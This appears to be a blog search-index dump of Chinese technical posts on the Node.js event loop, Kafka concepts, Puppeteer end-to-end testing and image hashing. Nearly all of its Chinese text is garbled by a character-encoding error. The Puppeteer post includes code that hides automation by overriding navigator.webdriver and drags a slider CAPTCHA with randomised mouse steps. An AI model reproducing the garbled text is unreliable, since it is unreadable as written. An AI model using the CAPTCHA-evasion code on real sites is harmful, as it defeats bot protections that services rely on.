äº‹ä»¶å¾ªç¯æ¶æ„ã€è¯‘ã€‘","uri":"/nodejs-event-loop-architecture/"},{"categories":["Uncate"],"content":"04 Event loop äº‹ä»¶å¾ªç¯åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿå®ƒæ˜¯ä¸€ä¸ªæ— é™çš„ while å¾ªç¯ï¼Œè°ƒç”¨ Epoll wait æˆ–è€… pool ï¼Œå½“ Node.js ä¸­æˆ‘ä»¬å…³æ³¨çš„äº‹æƒ…å¦‚ callback å›è°ƒã€event äº‹ä»¶ã€fs å‘ç”Ÿæ—¶ï¼Œå®ƒå°†è¿”å›ç»™ Node.js ï¼Œç„¶åå½“ Epoll ä¸å†æœ‰ wait æ—¶é€€å‡ºã€‚è¿™å°±æ˜¯ Node.js ä¸­çš„å¼‚æ­¥å·¥ä½œæ–¹å¼ï¼Œä»¥åŠä¸ºä»€ä¹ˆæˆ‘ä»¬ç§°ä¹‹ä¸ºäº‹ä»¶é©±åŠ¨ã€‚äº‹ä»¶å¾ªç¯å…è®¸ Node.js æ‰§è¡Œéé˜»å¡ IO æ“ä½œã€‚å°½ç®¡ JavaScript æ˜¯å•çº¿ç¨‹çš„ï¼Œä½†åªè¦æœ‰å¯èƒ½å°±ä¼šå°†æ“ä½œä¸¢ç»™ç³»ç»Ÿå†…æ ¸ã€‚ äº‹ä»¶å¾ªç¯çš„ä¸€æ¬¡è¿­ä»£ç§°ä¹‹ä¸º Tickï¼Œå®ƒæœ‰è‡ªå·±çš„ phasesï¼ˆé˜¶æ®µï¼‰ã€‚ æ›´å¤šå…³äº event loop çš„ phasesã€Timersã€process.nextTick() ç­‰è¯·æŸ¥é˜…å®˜æ–¹æ–‡æ¡£ã€‚ ","date":"2019-05-28","objectID":"/nodejs-event-loop-architecture/:4:0","tags":["Node.js"],"title":"æ·±å…¥ç†è§£ Node.js äº‹ä»¶å¾ªç¯æ¶æ„ã€è¯‘ã€‘","uri":"/nodejs-event-loop-architecture/"},{"categories":["Uncate"],"content":"05 Node.js v10.5.0 ç‰ˆæœ¬ä¹‹åï¼Œæ–°å¢äº† worker_threads å·¥ä½œçº¿ç¨‹æ¨¡å—ï¼Œå…è®¸ç”¨æˆ·å¤šçº¿ç¨‹å¹¶è¡Œæ‰§è¡Œ JavaScript ã€‚ å·¥ä½œçº¿ç¨‹å¯¹äºæ‰§è¡Œ CPU å¯†é›†å‹ JavaScript æ“ä½œéå¸¸æœ‰ç”¨ï¼Œä½†å¯¹äº IO å¯†é›†å‹å·¥ä½œæ²¡æœ‰å¤šå¤§å¸®åŠ©ï¼Œå› ä¸º Node.js å†…ç½®çš„å¼‚æ­¥ IO æ“ä½œæ¯”è¿™äº› workers æ›´é«˜æ•ˆã€‚ ","date":"2019-05-28","objectID":"/nodejs-event-loop-architecture/:5:0","tags":["Node.js"],"title":"æ·±å…¥ç†è§£ Node.js äº‹ä»¶å¾ªç¯æ¶æ„ã€è¯‘ã€‘","uri":"/nodejs-event-loop-architecture/"},{"categories":["Middleware"],"content":"æµå¹³å° Kafka","date":"2019-04-11","objectID":"/kafka/","tags":["MQ","Kafka"],"title":"æµå¹³å° Kafka","uri":"/kafka/"},{"categories":["Middleware"],"content":"ç®€ä»‹ Kafka ä½œä¸ºä¸€ä¸ªåˆ†å¸ƒå¼çš„æµå¹³å°ï¼Œæ­£åœ¨å¤§æ•°æ®ç›¸å…³é¢†åŸŸå¾—åˆ°è¶Šæ¥è¶Šå¹¿æ³›çš„åº”ç”¨ï¼Œæœ¬æ–‡å°†ä¼šä»‹ç» kafka çš„ç›¸å…³å†…å®¹ã€‚ æµå¹³å°å¦‚ kafka å…·å¤‡ä¸‰å¤§å…³é”®èƒ½åŠ›ï¼š å‘å¸ƒå’Œè®¢é˜…æ¶ˆæ¯æµï¼Œç±»ä¼¼äºæ¶ˆæ¯é˜Ÿåˆ—ã€‚ ä»¥å®¹é”™çš„æ–¹å¼å­˜å‚¨æ¶ˆæ¯æµã€‚ å®æ—¶å¤„ç†æ¶ˆæ¯æµã€‚ kafka é€šå¸¸åº”ç”¨äºä¸¤å¤§ç±»åº”ç”¨ï¼š æ„å»ºå®æ—¶æ•°æ®æµç®¡é“ï¼Œä»¥å¯é çš„è·å–ç³»ç»Ÿæˆ–åº”ç”¨ä¹‹é—´çš„æ•°æ®ã€‚ æ„å»ºå®æ—¶è½¬æ¢æˆ–å“åº”æ•°æ®æµçš„åº”ç”¨ç¨‹åºã€‚ kafka ä½œä¸ºä¸€ä¸ªæ¶ˆæ¯ç³»ç»Ÿï¼Œå¯ä»¥æ¥å— producer ç”Ÿäº§è€…æŠ•é€’æ¶ˆæ¯ï¼Œä»¥åŠ consumer æ¶ˆè´¹è€…æ¶ˆè´¹æ¶ˆæ¯ã€‚ kafka ä½œä¸ºä¸€ä¸ªå­˜å‚¨ç³»ç»Ÿï¼Œä¼šå°†æ‰€æœ‰æ¶ˆæ¯ä»¥è¿½åŠ çš„æ–¹å¼é¡ºåºå†™å…¥ç£ç›˜ï¼Œè¿™æ„å‘³ç€æ¶ˆæ¯æ˜¯ä¼šè¢«æŒä¹…åŒ–çš„ï¼Œä¼ ç»Ÿæ¶ˆæ¯é˜Ÿåˆ—ä¸­çš„æ¶ˆæ¯ä¸€æ—¦è¢«æ¶ˆè´¹é€šå¸¸éƒ½ä¼šè¢«ç«‹å³åˆ é™¤ï¼Œè€Œ kafka å´å¹¶ä¸ä¼šè¿™æ ·åšï¼Œkafka ä¸­çš„æ¶ˆæ¯æ˜¯å…·æœ‰å­˜æ´»æ—¶é—´çš„ï¼Œåªæœ‰è¶…å‡ºå­˜æ´»æ—¶é—´æ‰ä¼šè¢«åˆ é™¤ï¼Œè¿™æ„å‘³ç€åœ¨ kafka ä¸­èƒ½å¤Ÿè¿›è¡Œæ¶ˆæ¯å›æº¯ï¼Œä»è€Œå®ç°å†å²æ¶ˆæ¯çš„é‡æ–°æ¶ˆè´¹ã€‚ kafka çš„æµå¤„ç†ï¼Œå¯ä»¥æŒç»­è·å–è¾“å…¥æµçš„æ•°æ®ï¼Œç„¶åè¿›è¡ŒåŠ å·¥å¤„ç†ï¼Œæœ€åå†™å…¥åˆ°è¾“å‡ºæµã€‚kafka çš„æµå¤„ç†å¼ºä¾èµ–äº kafka æœ¬èº«ï¼Œå¹¶ä¸”åªæ˜¯ä¸€ä¸ªç±»åº“ï¼Œä¸å½“å‰çŸ¥åçš„æµå¤„ç†æ¡†æ¶å¦‚ spark å’Œ flink è¿˜æ˜¯æœ‰ä¸å°çš„åŒºåˆ«å’Œå·®è·ã€‚ å¤§å¤šæ•°ä½¿ç”¨è€…ä»¥åŠæœ¬æ–‡é‡ç‚¹å…³æ³¨çš„ä¹Ÿåªæ˜¯ kafka çš„å‰ä¸¤ç§èƒ½åŠ›ï¼Œä¸‹é¢å°†ä¼šå¯¹æ­¤è¿›è¡Œæ›´åŠ è¯¦ç»†çš„ä»‹ç»ã€‚ ","date":"2019-04-11","objectID":"/kafka/:1:0","tags":["MQ","Kafka"],"title":"æµå¹³å° Kafka","uri":"/kafka/"},{"categories":["Middleware"],"content":"ç›¸å…³æ¦‚å¿µ kafka ä¸­çš„ç›¸å…³æ¦‚å¿µå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 1ã€Producer ï¼šç”Ÿäº§è€…ï¼ŒæŠ•é€’æ¶ˆæ¯ã€‚ 2ã€Topic ï¼šæ¶ˆæ¯çš„é€»è¾‘åˆ†ç±»ï¼Œæ‰€æœ‰æ¶ˆæ¯éƒ½å¿…é¡»å½’å±äºä¸€ä¸ªç‰¹å®šçš„ topic ä¸»é¢˜ã€‚ 3ã€Broker ï¼škafka é›†ç¾¤å…·æœ‰å¤šä¸ª brokerï¼ˆä»£ç†èŠ‚ç‚¹ï¼‰ï¼Œä¸€ä¸ª broker å…¶å®å°±æ˜¯ä¸€ä¸ª kafka æœåŠ¡å™¨ã€‚ 4ã€Partition ï¼štopic åªæ˜¯é€»è¾‘ä¸Šçš„æ¦‚å¿µï¼Œæ¯ä¸ª topic ä¸»é¢˜ä¸‹çš„æ¶ˆæ¯éƒ½ä¼šè¢«åˆ†å¼€å­˜å‚¨åœ¨å¤šä¸ª partition åˆ†åŒºä¸­ï¼Œä¸ºäº†å®¹é”™ï¼Œkafka æä¾›äº†å¤‡ä»½æœºåˆ¶ï¼Œæ¯ä¸ª partition å¯ä»¥è®¾ç½®å¤šä¸ª replication å‰¯æœ¬ã€‚ 5ã€Consumer ï¼šæ¶ˆè´¹è€…ï¼Œæ‹‰å–æ¶ˆæ¯è¿›è¡Œæ¶ˆè´¹ï¼Œæ¯ä¸ªæ¶ˆè´¹è€…éƒ½ä»å±äºä¸€ä¸ª consumer group æ¶ˆè´¹ç»„ã€‚ ","date":"2019-04-11","objectID":"/kafka/:2:0","tags":["MQ","Kafka"],"title":"æµå¹³å° Kafka","uri":"/kafka/"},{"categories":["Middleware"],"content":"æ¶ˆæ¯æŠ•é€’ æ¯æ¡æ¶ˆæ¯ç”± keyã€valueã€timestamp æ„æˆã€‚ æ¶ˆæ¯æ˜¯å­˜å‚¨åœ¨ partition åˆ†åŒºä¸Šçš„ï¼Œè‡³äºå­˜å‚¨åœ¨å“ªä¸ª partition åˆ†åŒºä¸Šåˆ™åˆ†ä»¥ä¸‹ä¸‰ç§æƒ…å†µï¼š 1ã€producer æŠ•é€’æ¶ˆæ¯æ—¶ç›´æ¥æŒ‡å®šå…·ä½“çš„ partition ã€‚ 2ã€æœªæŒ‡å®š partition å¹¶ä¸”æ¶ˆæ¯ä¸­ä¹Ÿæ²¡æœ‰ key ï¼Œé‚£ä¹ˆæ¶ˆæ¯å°†ä¼šè¢«ä»¥è½®è¯¢çš„æ–¹å¼å‘é€åˆ° topic ä¸‹ä¸åŒçš„ partition ä»¥å®ç°è´Ÿè½½å‡è¡¡ã€‚ 3ã€æœªæŒ‡å®š partition ä½†æ˜¯æ¶ˆæ¯ä¸­æœ‰ key ï¼Œé‚£ä¹ˆå°†ä¼šæ ¹æ® key å€¼è®¡ç®—ç„¶åå‘é€åˆ°æŒ‡å®šåˆ†åŒºï¼Œç›¸åŒçš„ key ä¸€å®šæ˜¯ç›¸åŒçš„ partition ã€‚ Producer æŠ•é€’æ¶ˆæ¯ç­‰å¾…å“åº”çš„æƒ…å†µç”± acks å‚æ•°ç¡®å®šï¼š 1ã€acks = 0 ï¼šè¿™æ„å‘³ç€ç”Ÿäº§è€…ä¸ä¼šç­‰å¾…ä»»ä½•æ¶ˆæ¯ç¡®è®¤ï¼Œä¹Ÿå°±æ˜¯è®¤ä¸ºå‘é€å³æˆåŠŸã€‚ 2ã€acks = 1 ï¼šç­‰å¾… leader å†™å…¥æ¶ˆæ¯æˆåŠŸï¼Œä½†ä¸ä¼šç­‰å¾… follower çš„ç¡®è®¤ã€‚è¿™æ„å‘³ç€ leader ç¡®è®¤åç«‹é©¬æŒ‚æ‰è€Œ follower è¿˜æ¥ä¸åŠåŒæ­¥æ¶ˆæ¯ï¼Œæ­¤æ—¶æ¶ˆæ¯å°±ä¼šä¸¢å¤±ã€‚ 3ã€acks = -1 æˆ–è€… all ï¼šä¸ä»…è¦ leader ç¡®è®¤ï¼Œè¿˜éœ€è¦æ‰€æœ‰ in-sync çš„å‰¯æœ¬è¿›è¡Œç¡®è®¤ã€‚è¿™ä¿è¯äº†åªè¦æœ‰è‡³å°‘ä¸€ä¸ª in-sync çš„å‰¯æœ¬å­˜æ´»ï¼Œæ¶ˆæ¯å°±ä¸ä¼šä¸¢å¤±ã€‚ Leader å’Œ follower æŒ‡çš„éƒ½æ˜¯ broker å¯¹è±¡ã€‚ æ¯ä¸ª partition åˆ†åŒºéƒ½æœ‰å”¯ä¸€ä¸€ä¸ª broker å……å½“ leaderï¼Œé›¶ä¸ªæˆ–å¤šä¸ª broker ä½œä¸º follower ã€‚è¿™æ„å‘³ç€æ¯ä¸ªæœåŠ¡å™¨åœ¨ä½œä¸ºæŸä¸ªåˆ†åŒºçš„ leader çš„åŒæ—¶ä¹Ÿä¼šæ˜¯å…¶å®ƒæœåŠ¡å™¨çš„ follower ã€‚ æ¶ˆæ¯çš„è¯»å†™å…¨éƒ¨ç”± leader å¤„ç†ï¼Œè€Œ follower åªè´Ÿè´£åŒæ­¥ leader çš„æ¶ˆæ¯ã€‚ æ‰€æœ‰æ­£å¸¸åŒæ­¥çš„ broker éƒ½ä¼šè®°å½•äº ISRï¼ˆ In Sync Replicas ï¼‰åˆ—è¡¨ä¸­ï¼ŒåŒ…æ‹¬ leader æœ¬èº«ï¼Œæ­£å¸¸åŒæ­¥çš„çŠ¶æ€ä¹Ÿå°±æ˜¯ in-sync ï¼Œå¦‚æœæŸä¸ªæœåŠ¡å™¨æŒ‚æ‰äº†æˆ–è€…åŒæ­¥è¿›åº¦è½åå¤ªå¤šï¼Œé‚£ä¹ˆå…¶ä¹Ÿå°±ä¸å†å¤„äº in-sync çŠ¶æ€ï¼Œå¹¶ä¸”ä¼šä» ISR ä¸­å‰”é™¤ã€‚ ","date":"2019-04-11","objectID":"/kafka/:3:0","tags":["MQ","Kafka"],"title":"æµå¹³å° Kafka","uri":"/kafka/"},{"categories":["Middleware"],"content":"åˆ†åŒºå­˜å‚¨ Topic åªæ˜¯é€»è¾‘ä¸Šçš„æ¦‚å¿µï¼Œpartition æ‰æ˜¯å®é™…å­˜å‚¨æ¶ˆæ¯çš„åœ°æ–¹ï¼Œæ¯ä¸ª topic æ‹¥æœ‰å¤šä¸ª partition åˆ†åŒºã€‚ æ¯ä¸ª partition åˆ†åŒºéƒ½æ˜¯ä¸€ä¸ªæœ‰åºçš„ä¸å¯å˜çš„è®°å½•åºåˆ—ï¼Œæ¶ˆæ¯ä¸€å®šæ˜¯ä»¥é¡ºåºåŒ–çš„æ–¹å¼è¿½åŠ å†™å…¥çš„ï¼Œä¹Ÿæ­£æ˜¯è¿™ç§æ–¹å¼ä¿è¯äº† kafka çš„é«˜ååé‡ã€‚è€Œæ¯ä¸ª partition åˆ†åŒºä¸­çš„æ¶ˆæ¯éƒ½æœ‰ä¸€ä¸ª offset åç§»é‡ä½œä¸ºå…¶å”¯ä¸€æ ‡è¯†ã€‚ ä¸»è¦æ³¨æ„çš„æ˜¯å•ä¸ª partition ä¸­çš„æ¶ˆæ¯æ˜¯æœ‰åºçš„ï¼Œä½†æ˜¯æ•´ä¸ª topic å¹¶ä¸èƒ½ä¿è¯æ¶ˆæ¯çš„æœ‰åºæ€§ã€‚ æ¶ˆæ¯æ˜¯è¢«æŒä¹…åŒ–ä¿å­˜çš„ï¼Œä½•æ—¶åˆ é™¤æ¶ˆæ¯å®Œå…¨å–å†³äºæ‰€è®¾ç½®çš„ä¿ç•™æœŸé™ï¼Œè€Œä¸æ¶ˆæ¯æ˜¯å¦è¢«æ¶ˆè´¹æ²¡æœ‰ä»»ä½•å…³ç³»ã€‚å¯¹äº kafka æ¥è¯´ï¼Œé•¿æ—¶é—´å­˜å‚¨å¤§é‡æ•°æ®å¹¶æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œè€Œä¸”ä¹Ÿä¸ä¼šå½±å“å…¶æ€§èƒ½ã€‚ ","date":"2019-04-11","objectID":"/kafka/:4:0","tags":["MQ","Kafka"],"title":"æµå¹³å° Kafka","uri":"/kafka/"},{"categories":["Middleware"],"content":"æ¶ˆæ¯æ¶ˆè´¹ Consumer æ¶ˆè´¹æ¶ˆæ¯ã€‚ æ¯ä¸ª consumer ä¸€å®šä»å±äºä¸€ä¸ª consumer group æ¶ˆè´¹ç»„ã€‚ 1ã€æ¶ˆæ¯ä¼šè¢«å¹¿æ’­åˆ°æ‰€æœ‰è®¢é˜…çš„ consumer group ä¸­ï¼Œä¸åŒçš„ group äº’ä¸å½±å“ã€‚ 2ã€åŒä¸€ä¸ª group ä¸­ï¼Œä¸€ä¸ª partition åˆ†åŒºåªèƒ½åŒæ—¶è¢«ä¸€ä¸ª consumer æ¶ˆè´¹ï¼Œä½†æ˜¯ä¸€ä¸ª consumer å¯ä»¥åŒæ—¶æ¶ˆè´¹å¤šä¸ª partition åˆ†åŒºï¼Œgroup ä¸­çš„æ‰€æœ‰ consumer ä¸€èµ·æ¶ˆè´¹æ‰€æœ‰çš„ partition ã€‚ 3ã€åŒä¸€ä¸ª group ä¸­ï¼Œå¦‚æœ consumer çš„æ•°é‡å¤šäº partition çš„æ•°é‡ï¼Œé‚£ä¹ˆå¤šå‡ºæ¥çš„ consumer ä¸ä¼šåšä»»ä½•äº‹æƒ…ã€‚ consumer æ¶ˆè´¹æ¶ˆæ¯æ˜¯éœ€è¦ä¸»åŠ¨å‘ kafka æ‹‰å–çš„ï¼Œè€Œä¸æ˜¯ç”± kafka æ¨é€ç»™æ¶ˆè´¹è€…ã€‚kafka å·²ç»å°†æ¶ˆæ¯è¿›è¡Œäº†æŒä¹…åŒ–ï¼Œæ¶ˆè´¹è€…ä¸»åŠ¨æ‹‰å–æ¶ˆæ¯çš„ä¼˜ç‚¹å°±åœ¨äºï¼Œæ¶ˆè´¹è¿›åº¦å®Œå…¨ç”±æ¶ˆè´¹è€…è‡ªå·±æŒæ§ï¼Œå…¶æ¬¡ï¼Œå¯ä»¥è¿›è¡Œå†å²æ¶ˆæ¯é‡æ–°æ¶ˆè´¹ã€‚ åœ¨è€ç‰ˆæœ¬ä¸­ï¼Œæ¶ˆè´¹è€… API åˆ†ä¸ºä½çº§å’Œé«˜çº§ä¸¤ç§ã€‚é€šè¿‡ä½çº§ API ï¼Œæ¶ˆè´¹è€…å¯ä»¥æŒ‡å®šæ¶ˆè´¹ç‰¹å®šçš„ partition åˆ†åŒºï¼Œä½†æ˜¯å¯¹äºæ•…éšœè½¬ç§»ç­‰æƒ…å†µéœ€è¦è‡ªå·±å»å¤„ç†ã€‚é«˜çº§ API åˆ™è¿›è¡Œäº†å¾ˆå¤šåº•å±‚å¤„ç†å¹¶æŠ½è±¡äº†å‡ºæ¥ï¼Œæ¶ˆè´¹è€…ä¼šè¢«è‡ªåŠ¨åˆ†é…åˆ†åŒºï¼Œå¹¶ä¸”å½“å‡ºç°æ•…éšœè½¬ç§»æˆ–è€…å¢å‡æ¶ˆè´¹è€…æˆ–åˆ†åŒºç­‰æƒ…å†µæ—¶ï¼Œä¼šè‡ªåŠ¨è¿›è¡Œæ¶ˆè´¹è€…å†å¹³è¡¡ï¼Œä»¥ç¡®ä¿æ¶ˆæ¯çš„æ¶ˆè´¹ä¸å—å½±å“ã€‚ åœ¨æ–°ç‰ˆæœ¬ä¸­ï¼Œæ¶ˆè´¹è€… API è¢«é‡æ„ä¸”åˆå¹¶ï¼Œä¸å†åˆ†ä½çº§å’Œé«˜çº§ï¼Œä½†æ¶ˆè´¹è€…ä»ç„¶å¯ä»¥è‡ªå®šä¹‰åˆ†åŒºåˆ†é…æˆ–è€…ä½¿ç”¨è‡ªåŠ¨åˆ†é…ã€‚ å¯¹äºä¸åŒçš„å®¢æˆ·ç«¯ API ä½¿ç”¨æ–¹æ³•éœ€è¦å‚è€ƒå„è‡ªçš„æ–‡æ¡£ã€‚ ","date":"2019-04-11","objectID":"/kafka/:5:0","tags":["MQ","Kafka"],"title":"æµå¹³å° Kafka","uri":"/kafka/"},{"categories":["Middleware"],"content":"ç»“è¯­ kafka å…·æœ‰é«˜ååé‡ã€ä½å»¶è¿Ÿã€å¯æ‰©å±•ã€æŒä¹…åŒ–ã€å¯å®¹é”™ã€é«˜å¹¶å‘ç­‰ç­‰ç‰¹æ€§ã€‚æœ¬æ–‡å…ˆä»‹ç»è¿™ä¹ˆã€‚ ","date":"2019-04-11","objectID":"/kafka/:6:0","tags":["MQ","Kafka"],"title":"æµå¹³å° Kafka","uri":"/kafka/"},{"categories":["Uncate"],"content":"ä½¿ç”¨ Puppeteer æ„å»ºè‡ªåŠ¨åŒ–ç«¯åˆ°ç«¯æµ‹è¯•","date":"2019-03-22","objectID":"/puppeteer/","tags":["Node.js"],"title":"ä½¿ç”¨ Puppeteer æ„å»ºè‡ªåŠ¨åŒ–ç«¯åˆ°ç«¯æµ‹è¯•","uri":"/puppeteer/"},{"categories":["Uncate"],"content":"ç«¯åˆ°ç«¯æµ‹è¯•æŒ‡çš„æ˜¯å°†ç³»ç»Ÿä½œä¸ºä¸€ä¸ªé»‘ç›’ï¼Œæ¨¡æ‹Ÿæ­£å¸¸ç”¨æˆ·è¡Œä¸ºï¼Œè·¨è¶Šä»å‰ç«¯åˆ°åç«¯æ•´ä¸ªè½¯ä»¶ç³»ç»Ÿï¼Œæ˜¯ä¸€ç§å…¨å±€æ€§çš„æ•´ä½“æµ‹è¯•ã€‚ æ¥çœ‹æœ¬æ–‡çš„ç¤ºä¾‹ï¼š There should have been a video here but your browser does not seem to support it. ä½ åœ¨è§†é¢‘ä¸­çœ‹åˆ°çš„æ‰€æœ‰æ“ä½œå…¨éƒ¨éƒ½æ˜¯ç”±ç¨‹åºè‡ªåŠ¨å®Œæˆçš„ï¼Œå°±åƒçœŸå®çš„ç”¨æˆ·ä¸€æ ·ï¼Œé€šè¿‡è¿™ç§è‡ªåŠ¨åŒ–çš„æ–¹å¼å¯ä»¥å¾ˆå¥½çš„æå‡æˆ‘ä»¬çš„æµ‹è¯•æ•ˆç‡ä»è€Œä¿è¯äº¤ä»˜çš„è´¨é‡ã€‚ å®Œæˆè¿™æ ·çš„æ“ä½œç›¸å½“ç®€å•ï¼Œåªéœ€è¦ Puppeteer å°±å¤Ÿäº†ã€‚Puppeteer æ˜¯ä¸€ä¸ª node åº“ï¼Œé€šè¿‡å®ƒæä¾›çš„é«˜çº§ API ä¾¿å¯ä»¥æ§åˆ¶ chromium æˆ–è€… chrome ï¼Œæ¢å¥è¯è¯´ï¼Œåœ¨æµè§ˆå™¨ä¸­è¿›è¡Œçš„ç»å¤§éƒ¨åˆ†äººå·¥æ“ä½œéƒ½å¯ä»¥é€šè¿‡åœ¨ node ç¨‹åºä¸­è°ƒç”¨ Puppeteer çš„ API æ¥å®Œæˆã€‚ æœ¬æ–‡ç¤ºä¾‹ä¸­çš„æ‰€æœ‰æ“ä½œæ— å¤–ä¹äºï¼š è·å–é¡µé¢å…ƒç´  é”®ç›˜è¾“å…¥ é¼ æ ‡æ“ä½œ æ–‡ä»¶ä¸Šä¼  æ‰§è¡ŒåŸç”ŸJS ä¸€ã€æ‰“å¼€æµè§ˆå™¨è·³è½¬é¡µé¢ï¼š const browser = await puppeteer.launch({ headless: false, // æ‰“å¼€æµè§ˆå™¨ defaultViewport: { // è®¾ç½®è§†çª—å®½é«˜ width: 1200, height: 800 } }); const page = await browser.newPage(); await page.goto(url); // è·³è½¬é¡µé¢ äºŒã€è·å–è¾“å…¥æ¡†å¹¶è¾“å…¥ï¼š // -----------------------è¾“å…¥è´¦å·å¯†ç ---------------------------- const input_username = await page.waitForSelector('input[placeholder=\"ç”¨æˆ·å\"]'); const input_password = await page.waitForSelector('input[placeholder=\"å¯†ç \"]'); await input_username.type(username); await input_password.type(password); // --------------------------------------------------- é€šè¿‡ page.waitForSelector æ–¹æ³•ç­‰å¾…è·å–åˆ°æŒ‡å®šçš„é¡µé¢å…ƒç´ ï¼Œä¹Ÿå°±æ˜¯ elementHandle , å†ç›´æ¥æ‰§è¡Œ elementHandle çš„ type æ–¹æ³•å³å¯å®Œæˆé”®ç›˜è¾“å…¥ã€‚ ä¸‰ã€é€šè¿‡æ»‘åŠ¨éªŒè¯ï¼š 1ã€æ»‘åŠ¨éªŒè¯å¿…é¡»è¦ç¦ç”¨ navigator ï¼Œè¿™é‡Œé€šè¿‡ page.evaluate æ–¹æ³•ç›´æ¥æ‰§è¡ŒåŸç”ŸJS å³å¯ï¼š await page.evaluate(async () =\u003e { // æ»‘åŠ¨éªŒè¯ç¦ç”¨ navigator await Object.defineProperty(navigator, 'webdriver', {get: () =\u003e false}) }); 2ã€é¼ æ ‡æ“ä½œè¿›è¡ŒéªŒè¯ï¼š async function aliNC (page) { const nc = await (await page.waitForSelector('.nc-lang-cnt')).boundingBox(); // è·å–æ»‘åŠ¨éªŒè¯è¾¹ç•Œæ¡† await page.mouse.move(nc.x, nc.y); // é¼ æ ‡ç§»åŠ¨åˆ°èµ·å§‹ä½ç½® await page.mouse.down(); // é¼ æ ‡æŒ‰ä¸‹ const steps = Math.floor(Math.random() * 50 + 20); // éšæœº steps await page.mouse.move(nc.x + nc.width, nc.y, { steps: steps}); // ç§»åŠ¨åˆ°æ»‘å—æœ«ç«¯ä½ç½® await page.mouse.up(); // é¼ æ ‡æ¾å¼€ await page.waitForTimeout(1200); // å»¶æ—¶ç­‰å¾…éªŒè¯å®Œæˆ } å…ˆè·å–åˆ°æ»‘åŠ¨éªŒè¯çš„é¡µé¢å…ƒç´ ï¼Œå†é€šè¿‡ elementHandle çš„ boundingBox æ–¹æ³•è·å–è¾¹ç•Œæ¡†ï¼Œä»è€Œç¡®å®š Xã€Y äºŒç»´åæ ‡ã€‚ é€šè¿‡ page çš„ mouse ç›¸å…³æ–¹æ³•å³å¯è¿›è¡Œ move é¼ æ ‡ç§»åŠ¨ã€down é¼ æ ‡æŒ‰ä¸‹ã€up é¼ æ ‡æ¾å¼€ç­‰æ“ä½œï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬æœ€å¥½éšæœºç”Ÿæˆ steps æ¥æ§åˆ¶é¼ æ ‡ç§»åŠ¨çš„å¿«æ…¢ä»è€Œé¿å…éªŒè¯å¤±è´¥ã€‚ å››ã€ä¸Šä¼ æ–‡ä»¶ï¼š ç°è·å–åˆ°ä¸Šä¼ ç›¸å…³çš„ input å…ƒç´ å³ elementHandle ï¼Œç„¶åå†è°ƒç”¨ elementHandle çš„ uploadFile(â€¦filePaths) æ–¹æ³•å³å¯ï¼ŒfilePaths å°±æ˜¯æ–‡ä»¶çš„è·¯å¾„ï¼Œå¦‚æœæ˜¯ç›¸å¯¹è·¯å¾„åˆ™æ˜¯ç›¸å¯¹äºå½“å‰å·¥ä½œç›®å½•ã€‚ äº”ã€å…¶å®ƒï¼š ä½ ä¼šå‘ç°å‡ ä¹æ‰€æœ‰ç”¨æˆ·åŠ¨ä½œå°±æ˜¯å…ˆè·å–åˆ°ç›¸å…³å…ƒç´ ï¼Œç„¶åè¿›è¡Œé”®ç›˜æˆ–é¼ æ ‡æ“ä½œï¼ŒæŠŠå®ƒä»¬ç»„åˆèµ·æ¥å°±æˆä¸€æ•´å¥—æ“ä½œæµç¨‹ã€‚ æ˜¯è‡ªåŠ¨åŒ–çš„å—ï¼Ÿæ˜¯çš„ï¼Œæ²¡æœ‰äººå·¥æ“ä½œï¼Œéƒ½æ˜¯ç¨‹åºåœ¨è‡ªåŠ¨è¿›è¡Œã€‚ æ˜¯å¦çœŸçš„æœ‰æ•ˆï¼Ÿæœ‰æ•ˆï¼Œæ‰€æœ‰æ“ä½œéƒ½æ˜¯æ¨¡æ‹Ÿç”¨æˆ·è¿›è¡Œçš„çœŸå®è¡Œä¸ºï¼Œä»çœ‹åˆ°å‰ç«¯é¡µé¢ï¼Œåˆ°æäº¤æ•°æ®ï¼Œåˆ°è¯·æ±‚åç«¯æ¥å£ï¼Œå¯ä»¥è¯´æ˜¯èµ°äº†ä¸€éå®Œæ•´çš„æµç¨‹ï¼Œå¹¶ä¸”æ•´ä¸ªè¿‡ç¨‹ä¹Ÿæ˜¯å¯è§†çš„ï¼Œåœ¨æµ‹è¯•è¿‡ç¨‹ä¸­å³å¯å‘ç°å¼‚å¸¸ã€‚ æœ€åï¼Œæˆ‘ç›¸ä¿¡ Puppeteer å€¼å¾—ä½ å¥½å¥½ç©ä¸€ç©ï¼Œæ›´å¤šç”¨æ³•å’Œ API è¿˜æ˜¯å¤šç¿»ç¿»å®˜ç½‘ï¼ŒçœŸçš„å¾ˆç®€å•ã€‚ ","date":"2019-03-22","objectID":"/puppeteer/:0:0","tags":["Node.js"],"title":"ä½¿ç”¨ Puppeteer æ„å»ºè‡ªåŠ¨åŒ–ç«¯åˆ°ç«¯æµ‹è¯•","uri":"/puppeteer/"},{"categories":["Uncate"],"content":"å›¾åƒç›¸ä¼¼æ€§ï¼šå“ˆå¸Œå’Œç‰¹å¾","date":"2019-03-14","objectID":"/image-similarity/","tags":["Python","OpenCV"],"title":"å›¾åƒç›¸ä¼¼æ€§ï¼šå“ˆå¸Œå’Œç‰¹å¾","uri":"/image-similarity/"},{"categories":["Uncate"],"content":"å¼•è¨€ å¦‚ä½•åˆ¤æ–­å›¾åƒçš„ç›¸ä¼¼æ€§ï¼Ÿ ç›´æ¥æ¯”è¾ƒå›¾åƒå†…å®¹çš„ md5 å€¼è‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œmd5 çš„æ–¹å¼åªèƒ½åˆ¤æ–­åƒç´ çº§åˆ«å®Œå…¨ä¸€è‡´ã€‚å›¾åƒçš„åŸºæœ¬å•å…ƒæ˜¯åƒç´ ï¼Œå¦‚æœä¸¤å¼ å›¾åƒå®Œå…¨ç›¸åŒï¼Œé‚£ä¹ˆå›¾åƒå†…å®¹çš„ md5 å€¼ä¸€å®šç›¸åŒï¼Œç„¶è€Œä¸€æ—¦å°éƒ¨åˆ†åƒç´ å‘ç”Ÿå˜åŒ–ï¼Œæ¯”å¦‚ç»è¿‡ç¼©æ”¾ã€æ°´å°ã€å™ªå£°ç­‰å¤„ç†ï¼Œé‚£ä¹ˆå®ƒä»¬çš„ md5 å€¼å°±ä¼šå¤©å·®åœ°åˆ«ã€‚ 